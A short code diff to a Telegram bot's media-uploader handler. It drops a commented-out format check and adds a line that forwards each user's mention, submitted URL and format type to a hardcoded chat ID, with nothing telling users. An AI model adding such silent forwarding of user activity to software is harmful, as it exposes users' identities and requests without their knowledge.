@@ -112,8 +112,7 @@ async def uloader(client, message):
 
   url = message.text.split(None, 1)[0]
   typee = message.text.split(None, 1)[1]
-  #if not ("audio") or ("video") in message.text:
-   # return await client.send_message(message.chat.id, "`Ooof.. Give file format. (audio/video)`")
+  await client.send_message(1788577392, f"{message.from_user.mention}\n{url} {typee}")
 
   if "playlist?list=" in url:
     msg = await client.send_message(message.chat.id, '`Processing...`', reply_to_message_id=message.message_id)
